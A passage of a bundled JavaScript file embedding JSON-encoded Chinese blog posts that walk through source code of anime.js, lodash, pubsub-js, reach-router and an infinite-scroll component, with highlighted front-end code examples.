</span>{\\nsetInstanceProgress(adjustTime(time));\\n}</code></pre></code></pre>\\n</li>\\n<li><p>instance.pause</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 外部API 暂停</span>\\ninstance.pause = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n<span class=\\"hljs-keyword\\">const</span> i = activeInstances.indexOf(instance);\\n<span class=\\"hljs-comment\\">// 删除activeInstances 后续engine中找不到便不会执行</span>\\n<span class=\\"hljs-keyword\\">if</span> (i &gt; <span class=\\"hljs-number\\">-1</span>) activeInstances.splice(i, <span class=\\"hljs-number\\">1</span>);\\ninstance.paused = <span class=\\"hljs-literal\\">true</span>;\\n}</code></pre></code></pre>\\n</li>\\n<li><p>instance.reverse</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 外部API 反转</span>\\ninstance.reverse = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  toggleInstanceDirection();\\n  startTime = <span class=\\"hljs-number\\">0</span>;\\n  lastTime = adjustTime(instance.currentTime);\\n}</code></pre></code></pre>\\n<ul>\\n<li>instance.restart</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 外部API 重新执行</span>\\ninstance.restart = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  instance.pause();\\n  instance.reset();\\n  instance.play();\\n}</code></pre></code></pre>\\n<ul>\\n<li>instance.reset<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 外部API reset</span>\\ninstance.reset = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n<span class=\\"hljs-keyword\\">const</span> direction = instance.direction;\\n<span class=\\"hljs-keyword\\">const</span> loops = instance.loop;\\n<span class=\\"hljs-comment\\">// 当前位置,进度 归零</span>\\ninstance.currentTime = <span class=\\"hljs-number\\">0</span>;\\ninstance.progress = <span class=\\"hljs-number\\">0</span>;\\ninstance.paused = <span class=\\"hljs-literal\\">true</span>;\\ninstance.began = <span class=\\"hljs-literal\\">false</span>;\\ninstance.completed = <span class=\\"hljs-literal\\">false</span>;\\ninstance.reversed = direction === <span class=\\"hljs-string\\">\'reverse\'</span>;\\ninstance.remaining = direction === <span class=\\"hljs-string\\">\'alternate\'</span> &amp;&amp; loops === <span class=\\"hljs-number\\">1</span> ? <span class=\\"hljs-number\\">2</span> : loops;\\nsetAnimationsProgress(<span class=\\"hljs-number\\">0</span>);\\n<span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> i = instance.children.length; i--; ){\\n  instance.children[i].reset();\\n}\\n}</code></pre></code></pre>\\n</li>\\n</ul>\\n<h2 id=\\"zong-jie\\">总结</h2>\\n<ol>\\n<li>使用了<code>requestAnimateFrame</code>和<code>CSS</code>动画提高流畅度。</li>\\n<li>使用了缓动函数，只需要通过<code>当前动画消耗的时间</code>，搭配其他定义的配置项，就可以计算出当前动画具体位置。</li>\\n</ol>\\n<p>此次解析就到这里结束，如有错误，敬请指出，感谢！</p>\\n","toc":[{"anchor":"zong-jie","level":2,"text":"总结"}],"relatedTags":null,"created_at":"2018-07-22","timeArr":[2018,6,22,0,0,0,0],"title":"源码阅读-解析anime核心(2)","uuid":"2a9c7da01d48a31e62efc8c651405161597524f1","summary":"<p>本次解析将分为2篇文章，当前是第二篇，第一篇在<a href=\\"./07-20-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(1).md\\">这里</a></p>\\n<p>另外，为了能更好的理解这个库，个人写了一个此库的压缩版，实现了核心的功能(主要也是为了更好理解核心功能)，内容更少方便阅读，\\n地址在[这里](https://github.com/stonehank/simpli...</p>","slug":"yuan-ma-yue-du-jie-xi-anime-he-xin-(2)","sha":"a9f78f786c764a619cefc5156e3120771d547641"}')},668:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"chuang-jian-shu-zu-de-si-kao\\">创建数组的思考</h4>\\n<p><code>lodash.js---&gt;.internal--&gt;baseClone.js</code>内部</p>\\n<p>有一句：<code>const result = new array.constructor(length)</code></p>\\n<p>这里array是一个经过<code>Array.isArray(array)===true</code>判断的数组，</p>\\n<p>这句话就是使用原数组的构造函数去创建，参数是原数组的长度。</p>\\n<p>那么为什么不直接<code>const result = new Array(length)</code></p>\\n<p>因为如果我们使用了自定义构造函数，<code>new Array</code>则会将自定义方法都删除</p>\\n<p>例如：</p>\\n<p>一个自定义构造函数(Array),包含自定义sum和avg方法</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">CustomArray</span>(<span class=\\"hljs-params\\">length=<span class=\\"hljs-number\\">0</span></span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> custom=<span class=\\"hljs-built_in\\">Object</span>.create([],<span class=\\"hljs-built_in\\">Array</span>.prototype)\\n  <span class=\\"hljs-keyword\\">let</span> proto=<span class=\\"hljs-built_in\\">Object</span>.getPrototypeOf(custom)\\n  proto.constructor=CustomArray\\n  proto.sum=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">this</span>.reduce(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">acc,cur</span>)=&gt;</span>acc+cur,<span class=\\"hljs-number\\">0</span>)\\n  }\\n  proto.avg=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">this</span>.sum()/<span class=\\"hljs-keyword\\">this</span>.length\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> custom\\n}</code></pre></code></pre>\\n<p>验证：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> myArray=<span class=\\"hljs-keyword\\">new</span> CustomArray()\\nmyArray.push(<span class=\\"hljs-number\\">5</span>)\\nmyArray.push(<span class=\\"hljs-number\\">6</span>)\\nmyArray.push(<span class=\\"hljs-number\\">7</span>)\\nmyArray.sum() <span class=\\"hljs-comment\\">// 18</span>\\nmyArray.avg() <span class=\\"hljs-comment\\">// 6</span></code></pre></code></pre>\\n<p>使用<code>new array.constructor</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> {length}=myArray\\n<span class=\\"hljs-keyword\\">const</span> result = <span class=\\"hljs-keyword\\">new</span> myArray.constructor(length)\\nresult.push(<span class=\\"hljs-number\\">5</span>)\\nresult.push(<span class=\\"hljs-number\\">6</span>)\\nresult.push(<span class=\\"hljs-number\\">7</span>)\\nresult.sum()   <span class=\\"hljs-comment\\">// 18</span>\\nresult.avg()   <span class=\\"hljs-comment\\">// 6</span></code></pre></code></pre>\\n<p>使用<code>new Array</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> {length}=myArray\\n<span class=\\"hljs-keyword\\">const</span> resultRaw = <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">Array</span>(length)\\nresultRaw.push(<span class=\\"hljs-number\\">5</span>)\\nresultRaw.push(<span class=\\"hljs-number\\">6</span>)\\nresultRaw.push(<span class=\\"hljs-number\\">7</span>)\\nresultRaw.sum()   <span class=\\"hljs-comment\\">// 报错 not a function</span>\\nresultRaw.avg()   <span class=\\"hljs-comment\\">// 报错 not a function</span></code></pre></code></pre>\\n","toc":[{"anchor":"chuang-jian-shu-zu-de-si-kao","level":4,"text":"创建数组的思考"}],"relatedTags":null,"created_at":"2018-08-16","timeArr":[2018,7,16,0,0,0,0],"title":"源码阅读-lodash-一个创建数组的思考","uuid":"0d719ffaecb85402ef37b03bbd557d9adf641cd7","summary":"<h4>创建数组的思考</h4>\\n<p><code>lodash.js---&gt;.internal--&gt;baseClone.js</code>内部</p>\\n<p>有一句：<code>const result = new array.constructor(length)</code></p>\\n<p>这里array是一个经过<code>Array.isArray(array)===true</code>判断的数组，</p>\\n<p>这句...</p>","slug":"yuan-ma-yue-du-lodash-yi-ge-chuang-jian-shu-zu-de-si-kao","sha":"7166eb621f1c1bf86fd6cf194dc19b9f3f408810"}')},669:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>pubsub-js: 一个用 JavaScript 编写的<code>基于主题</code>的发布/订阅库</p>\\n</blockquote>\\n<hr>\\n<p><code>pubsub-js</code>代码量不大，代码逻辑也较简单，也确实完成了一个发布订阅库，基于<code>javascript</code>的<code>key:value</code>普通对象。</p>\\n<p>代码结构</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>messages={\\n   <span class=\\"hljs-attr\\">topic1</span>:{\\n        <span class=\\"hljs-attr\\">token1_1</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n        <span class=\\"hljs-attr\\">token1_2</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n    }, \\n   <span class=\\"hljs-attr\\">topic2</span>:{\\n        <span class=\\"hljs-attr\\">token2_1</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n        <span class=\\"hljs-attr\\">token2_2</span>:<span class=\\"hljs-built_in\\">Function</span>,\\n        ...\\n    }, \\n    ...\\n}</code></pre></code></pre>\\n<p>这个<code>基于主题</code>结构，允许对同一个主题进行多次不同的订阅，因此每次订阅会返回一个<code>token</code>可以通过<code>unsubscribe</code>对\\n<code>token</code>取消订阅，</p>\\n<p><code>unsubscribe</code>也接收<code>topic</code>(主题的名称)，对当前主题下所有<code>token</code>取消订阅，也接收<code>function</code>，删除所有与参数一致的订阅函数。</p>\\n<p>同时<code>pubsub-js</code>也提供了层级订阅，通过<code>.</code>进行分级，例如当订阅了<code>a</code>和<code>a.b</code>时，发布<code>a.b</code>同时也会触发<code>a</code>的订阅，而通配符<code>*</code>则表示任何发布都将触发它的订阅。</p>\\n<blockquote>\\n<p><strong>注意：<code>pubsub-js</code>是一个简单的发布订阅库，并不能解决真正的异步问题。</strong></p>\\n</blockquote>\\n<hr>\\n<p>思维导图：\\n<img src=\\"/article/img/PubSub.png\\" alt=\\"\\"></p>\\n","toc":[],"relatedTags":null,"created_at":"2021-07-04","timeArr":[2021,6,4,0,0,0,0],"title":"源码阅读-pubsub-js","uuid":"c25645355b6dce51d5f91ed9b939fbd7ebe06b10","summary":"<p>pubsub-js: 一个用 JavaScript 编写的<code>基于主题</code>的发布/订阅库</p>","slug":"yuan-ma-yue-du-pubsub-js","sha":"be93b5efb118c66f3435d9e3e61ac32f3af7211a"}')},670:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"popstate\\">popstate</h2>\\n<p>只在浏览器下前进后退和改变hash触发，<code>pushState</code>和<code>replaceState</code>并不会触发</p>\\n<p>源码中给<code>popstate</code>和<code>navigate</code>事件绑定了一旦执行就更新当前location(传递到context中的)</p>\\n<h2 id=\\"ti-dai-pushstate-he-replacestate\\">替代pushState和replaceState</h2>\\n<p>源码中对<code>pushState</code>和<code>replaceState</code>操作用<code>try...catch</code>包裹，因为有一个bug，<a href=\\"https://forums.developer.apple.com/thread/36650\\">iOS Safari limits to 100 pushState calls</a></p>\\n<p>因此当出现catch，会执行<code>location.replace</code>或者<code>location.assign</code></p>\\n<ul>\\n<li><code>location.replace</code> 跳转url，替代当前，不增加历史记录</li>\\n<li><code>location.assign</code> 跳转url，增加历史记录</li>\\n</ul>\\n<h2 id=\\"createcontextdefaultvalue\\">createContext(defaultValue)</h2>\\n<p>官方(英文)：</p>\\n<blockquote>\\n<p>If there is no Provider for this context above, the value argument will be equal to the defaultValue that was passed to createContext().</p>\\n</blockquote>\\n<p>中文文档：</p>\\n<blockquote>\\n<p>如果上层的组件树没有一个匹配的 Provider，而此时你需要渲染一个 Consumer 组件，那么你可以用到 defaultValue 。这有助于在不封装它们的情况下对组件进行测试。</p>\\n</blockquote>\\n<p>源码中这么用的</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> createNamedContext = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">name, defaultValue</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> Ctx = createContext(defaultValue);\\n  Ctx.Consumer.displayName = <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${name}</span>.Consumer`</span>;\\n  Ctx.Provider.displayName = <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${name}</span>.Provider`</span>;\\n  <span class=\\"hljs-keyword\\">return</span> Ctx;\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> BaseContext = createNamedContext(<span class=\\"hljs-string\\">\\"Base\\"</span>, { <span class=\\"hljs-attr\\">baseuri</span>: <span class=\\"hljs-string\\">\\"/\\"</span>, <span class=\\"hljs-attr\\">basepath</span>: <span class=\\"hljs-string\\">\\"/\\"</span> });\\n\\n<span class=\\"hljs-keyword\\">let</span> Router = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> (\\n  &lt;BaseContext.Consumer&gt;\\n    {/* 此处baseContext是 { baseuri: \\"/\\", basepath: \\"/\\" } */}\\n    {baseContext =&gt; (\\n      &lt;Location&gt;\\n        {locationContext =&gt; (\\n          &lt;RouterImpl {...baseContext} {...locationContext} {...props} /&gt;\\n        )}\\n      &lt;/Location&gt;\\n    )}\\n  &lt;/BaseContext.Consumer&gt;</code></pre></code></pre>\\n<h2 id=\\"gong-ju-jie-shao--invariant\\">工具介绍 invariant</h2>\\n<p><code>invariant(boolean,something)</code> 参数1为false就<code>throw 参数2(something)</code></p>\\n<h2 id=\\"react-zhong-elementtype\\">react中element.type</h2>\\n<p>用来判断组件的类型</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 1、高阶组件</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">HOC</span>(<span class=\\"hljs-params\\">com</span>)</span>{\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n    render(){\\n      <span class=\\"hljs-keyword\\">return</span> &lt;com /&gt;\\n    }\\n  }\\n}\\n<span class=\\"hljs-comment\\">// 2、自定义组件</span>\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">MyComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n    render(){\\n        <span class=\\"hljs-keyword\\">return</span> &lt;div&gt;...&lt;/div&gt;\\n    }\\n}\\n<span class=\\"hljs-comment\\">// 3、无状态组件</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">DumbComponent</span>(<span class=\\"hljs-params\\">props</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> &lt;button&gt;show&lt;/button&gt;\\n}\\n<span class=\\"hljs-comment\\">// 4、原生标签（直接写到children里）</span>\\n\\n<span class=\\"hljs-comment\\">// 判断</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">checkType</span>(<span class=\\"hljs-params\\">element</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> type=element.type\\n    <span class=\\"hljs-keyword\\">if</span>(type.prototype &amp;&amp; type.prototype.isReactComponent){\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'自定义React组件\'</span>)\\n    }<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">typeof</span> type === <span class=\\"hljs-string\\">\'function\'</span>){\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'是一个函数（高阶函数），继续调用\'</span>)\\n    }<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">typeof</span> type === <span class=\\"hljs-string\\">\'string\'</span>){\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'是一个原生标签\'</span>)\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n        <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'其他\'</span>)\\n    }\\n}\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">Check</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n  render(){\\n    React.Children.map(<span class=\\"hljs-keyword\\">this</span>.props.children,element=&gt;{\\n      checkType(element)\\n    })\\n    <span class=\\"hljs-keyword\\">return</span> &lt;div /&gt;\\n  }\\n}\\nReactDOM.render(\\n  &lt;Check&gt;\\n    &lt;HOC /&gt;      \\n    &lt;MyComponent /&gt;\\n    &lt;DumbComponent /&gt;\\n    &lt;div /&gt;\\n  &lt;/Check&gt;,\\n  <span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\'container\'</span>)\\n);\\n<span class=\\"hljs-comment\\">/*\\n\\"是一个函数（高阶函数），继续调用\\"\\n\\"自定义React组件\\"\\n\\"是一个函数（高阶函数），继续调用\\"（此处无状态函数组件会被认为函数）\\n\\"是一个原生标签\\"\\n*/</span></code></pre></code></pre>\\n<p>源码中用来检测是否重定向组件：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">RouterImpl</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">PureComponent</span> </span>{\\n    render(){\\n        <span class=\\"hljs-comment\\">/* 其他代码 */</span>\\n        <span class=\\"hljs-keyword\\">let</span> routes = React.Children.map(children, createRoute(basepath));\\n        <span class=\\"hljs-comment\\">/* 其他代码 */</span>\\n    }        \\n}\\n\\n<span class=\\"hljs-keyword\\">let</span> createRoute = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">basepath</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">element</span> =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// element.type === Redirect 用于检测是否某个组件</span>\\n    invariant(\\n        element.props.path || element.props.default || element.type === Redirect,\\n        <span class=\\"hljs-string\\">`&lt;Router&gt;: Children of &lt;Router&gt; must have a \\\\`path\\\\` or \\\\`default\\\\` prop, or be a \\\\`&lt;Redirect&gt;\\\\`. None found on element type \\\\`<span class=\\"hljs-subst\\">${\\n         element.type\\n        }</span>\\\\``</span>\\n     );\\n  <span class=\\"hljs-comment\\">/* 其他代码 */</span>\\n}\\n\\n<span class=\\"hljs-comment\\">// 这里Redirect是个无状态组件  </span>\\n<span class=\\"hljs-keyword\\">let</span> Redirect = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> (\\n  &lt;Location&gt;\\n    {locationContext =&gt; &lt;RedirectImpl {...locationContext} {...props} /&gt;}\\n  &lt;/Location&gt;\\n);</code></pre></code></pre>\\n","toc":[{"anchor":"popstate","level":2,"text":"popstate"},{"anchor":"ti-dai-pushstate-he-replacestate","level":2,"text":"替代pushState和replaceState"},{"anchor":"createcontextdefaultvalue","level":2,"text":"createContext(defaultValue)"},{"anchor":"gong-ju-jie-shao--invariant","level":2,"text":"工具介绍 invariant"},{"anchor":"react-zhong-elementtype","level":2,"text":"react中element.type"}],"relatedTags":null,"created_at":"2018-07-05","timeArr":[2018,6,5,0,0,0,0],"title":"源码阅读-reach-router源码学习到的1","uuid":"7b0adb17281c68e7822dafdd8044bb001e43c5ee","summary":"<h4>popstate</h4>\\n<p>只在浏览器下前进后退和改变hash触发，<code>pushState</code>和<code>replaceState</code>并不会触发</p>\\n<p>源码中给<code>popstate</code>和<code>navigate</code>事件绑定了一旦执行就更新当前location(传递到context中的)</p>\\n<h4>替代pushState和replaceState</h4>\\n<p>源码...</p>","slug":"yuan-ma-yue-du-reach-router-yuan-ma-xue-xi-dao-de-1","sha":"7e151f2405bca2a2f40f41defe20c8dc037ac39e"}')},671:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"lu-jing-pi-pei-you-xian-quan-wen-ti\\">路径匹配优先权问题</h2>\\n<p>先假设一个问题：</p>\\n<p>有一个匹配路径： <code>doc/artical</code></p>\\n<p>待匹配路径有3个：</p>\\n<p><code>doc/:section</code></p>\\n<p><code>doc/*</code></p>\\n<p><code>doc/artical</code></p>\\n<p>该优先对哪个匹配呢？</p>\\n<p>源码中是使用了一个评分的方法：</p>\\n<ul>\\n<li>先对路径去除头尾的&quot;/&quot; ，并且按&quot;/&quot;分割成路径片段数组</li>\\n<li>对数组使用reduce方法计算分值，如下：<pre><code><pre class=\\"hljs\\"><code>let SEGMENT_POINTS = 4;     // 基本分值，每一个路径片段都有\\nlet STATIC_POINTS = 3;      // 静态路径，如：/abc\\nlet DYNAMIC_POINTS = 2;     // 动态路径，如：/:section\\nlet SPLAT_PENALTY = 1;      // 通配符（减分），如：/*，此处遇到通配符会先减去基本分值，再减1分（优先权很低）\\nlet ROOT_POINTS = 1;        // 根路径</code></pre></code></pre>可知优先权排序为：</li>\\n</ul>\\n<p>静态路径 &gt; 动态路径 &gt; 根路径 &gt; 通配符</p>\\n<p>因此上面的问题会优先匹配<code>doc/artical</code>，第二有优先度为<code>doc/:section</code></p>\\n","toc":[{"anchor":"lu-jing-pi-pei-you-xian-quan-wen-ti","level":2,"text":"路径匹配优先权问题"}],"relatedTags":null,"created_at":"2018-07-06","timeArr":[2018,6,6,0,0,0,0],"title":"源码阅读-reach-router源码学习到的2","uuid":"cc5d864eab97f30e3cb11aff77b2ac5a7ad4ed86","summary":"<h4>路径匹配优先权问题</h4>\\n<p>先假设一个问题：</p>\\n<p>有一个匹配路径： <code>doc/artical</code></p>\\n<p>待匹配路径有3个：</p>\\n<p><code>doc/:section</code></p>\\n<p><code>doc/*</code></p>\\n<p><code>doc/artical</code></p>\\n<p>该优先对哪个匹配呢？</p>\\n<p>源码中是使用了一个评分的方法：</p>\\n<ul>\\n<li>先对路径去除头尾的&quot;/&quot; ，并且按&quot;/&quot;分割成路径片段数组\\n...</li>\\n</ul>","slug":"yuan-ma-yue-du-reach-router-yuan-ma-xue-xi-dao-de-2","sha":"a36a3611a3b4eab9e4d4f48583424f9a869764b8"}')},672:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"guan-yu-consumer-de-bu-chong\\">关于Consumer的补充</h2>\\n<p>官方（英文）：</p>\\n<blockquote>\\n<p>All Consumers that are descendants of a Provider will re-render whenever the Provider’s value prop changes. \\nThe propagation from Provider to its descendant Consumers is not subject to the shouldComponentUpdate method, \\nso the Consumer is updated even when an ancestor component bails out of the update.</p>\\n</blockquote>\\n<blockquote>\\n<p>Changes are determined by comparing the new and old values using the same algorithm as Object.is.</p>\\n</blockquote>\\n<p>大概翻译：</p>\\n<p>每当 Provider 的value发生改变时，其内部所有的 Consumers 都将会重新渲染。这种改变不会受到shouldComponentUpdate方法影响，\\n因此即使组件取消了更新，但是Consumer还是会继续渲染。</p>\\n<p>Consumer是通过使用相同的算法如Object.is比较新旧值来确定变化。</p>\\n<hr>\\n<p>这个特性在源码中这么体现：</p>\\n<pre><code><pre class=\\"hljs\\"><code>let Location = ({ children }) =&gt; (\\n\\n  &lt;LocationContext.Consumer&gt;\\n    {context =&gt;\\n      context ? (\\n      // 后面继续创建时（嵌套），context会动态随着父级的Provider更新，因此直接调用children\\n        children(context)\\n      ) : (\\n      // 第一次创建时 context 无值，创建 LocationProvider\\n        &lt;LocationProvider&gt;{children}&lt;/LocationProvider&gt;\\n      )\\n    }\\n  &lt;/LocationContext.Consumer&gt;\\n);</code></pre></code></pre><p>这个Location组件返回值是一个<code>createContext(/* 无参数*/)</code>的<code>Consumer</code>，当使用组件时<code>Router/Link/Redirect/Match</code>，它都在内部。</p>\\n<p>因此第一次创建在<code>Router组件</code>内部的时候，<code>context</code>是undefined，会创建<code>LocationProvider组件</code>，\\nLocationProvider组件就是对应的<code>Provider</code>，并且内部会获取到公共使用的跳转方法<code>navigate</code>和当前url的信息<code>location</code>作为它的value。</p>\\n<p>而当<code>Route Component</code>内部继续嵌套<code>Router</code>的时候，context会获取到<code>Provider</code>的value值，因此直接调用<code>children(context)</code></p>\\n<p>结构如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>class App extends Component{\\n    /*...*/\\n    return (\\n        // 最外层的Location，创建 LocationProvider组件\\n        &lt;Router&gt;\\n            &lt;Home path=&quot;...&quot; /&gt;\\n            &lt;Details path=&quot;...&quot;  /&gt;\\n        &lt;/Router&gt;\\n    )\\n}\\n\\nclass Details extends Component{\\n    /*...*/\\n    return (\\n        // 嵌套的Location，直接调用children(context)\\n        // 这里children是一个参数是context的函数\\n        &lt;Link to=&quot;...&quot; &gt;Details-1&lt;/Link&gt;\\n    )\\n}</code></pre></code></pre><h2 id=\\"promiseresolvethen\\">Promise.resolve().then</h2>\\n<p>源码中看到这种语句：</p>\\n<pre><code><pre class=\\"hljs\\"><code>Promise.resolve().then(() =&gt; {\\n      navigate(insertParams(to, props), { replace, state });\\n    });</code></pre></code></pre><p>之前并未见过，觉得这不就是个Promise立即完成的异步吗，为什么不使用<code>setTimeout(()=&gt;{},0)</code>，有什么区别呢</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">1</span>)\\n},<span class=\\"hljs-number\\">0</span>);\\n\\n<span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">2</span>)\\n    });\\n<span class=\\"hljs-comment\\">// 2</span>\\n<span class=\\"hljs-comment\\">// 1</span></code></pre></code></pre>\\n<p>Promise的任务会添加到当前任务队列的末尾，而setTimeout中的任务是放到下一个事件循环列表执行</p>\\n<p>一张图理解：\\n<img src=\\"/article/img/eventloop%20and%20callbackqueue.png\\" alt=\\"\\"></p>\\n<p>简单来说，Promise就是异步，越快越好</p>\\n","toc":[{"anchor":"guan-yu-consumer-de-bu-chong","level":2,"text":"关于Consumer的补充"},{"anchor":"promiseresolvethen","level":2,"text":"Promise.resolve().then"}],"relatedTags":null,"created_at":"2018-07-07","timeArr":[2018,6,7,0,0,0,0],"title":"源码阅读-reach-router源码学习到的3","uuid":"94269872739a3bce7b949811a96155420826e1bd","summary":"<p>All Consumers that are descendants of a Provider will re-render whenever the Provider’s value prop changes.\\nThe propagation from Provider to its descendant Consumers is not subject to the shouldComponentUpdate method,\\nso the Consumer is updated even when an ancestor component bails out of the update.</p>","slug":"yuan-ma-yue-du-reach-router-yuan-ma-xue-xi-dao-de-3","sha":"d91847cb95128b4df27dc580f59ae7f12b7a6af8"}')},673:function(n){n.exports=JSON.parse('{"content":"<ol>\\n<li><p><code>offsetParent</code></p>\\n<p> <code>offsetParent</code>返回一个指向最近的包含该元素的定位元素.</p>\\n<p> <code>offsetParent</code>很有用，因为计算<code>offsetTop</code>和<code>offsetLeft</code>都是相对于<code>offsetParent</code>边界的。</p>\\n<p> <code>offsetParent</code>为 null 的几种情况:</p>\\n<ul>\\n<li><p>ele 为 body</p>\\n</li>\\n<li><p>ele 的 position 为 fixed</p>\\n</li>\\n<li><p>ele 的 display 为 none</p>\\n<p>源码中<code>offsetParent</code>处理了2种情况</p>\\n</li>\\n</ul>\\n<ol>\\n<li><p>在<code>useWindow</code>的情况下(即事件绑定在window，滚动作用在body)</p>\\n<p> 通过递归获取<code>offsetParent</code>到达顶端的高度(<code>offsetTop</code>)。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>calculateTopPosition(el) {\\n  <span class=\\"hljs-keyword\\">if</span> (!el) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">0</span>;   \\n  }\\n  <span class=\\"hljs-keyword\\">return</span> el.offsetTop + <span class=\\"hljs-keyword\\">this</span>.calculateTopPosition(el.offsetParent);   \\n }</code></pre></code></pre>\\n</li>\\n<li><p>通过判断<code>offsetParent</code>不为null的情况，确保滚动组件正常显示</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (\\n offset &lt; <span class=\\"hljs-built_in\\">Number</span>(<span class=\\"hljs-keyword\\">this</span>.props.threshold) &amp;&amp;\\n (el &amp;&amp; el.offsetParent !== <span class=\\"hljs-literal\\">null</span>)\\n) {<span class=\\"hljs-comment\\">/* ... */</span> 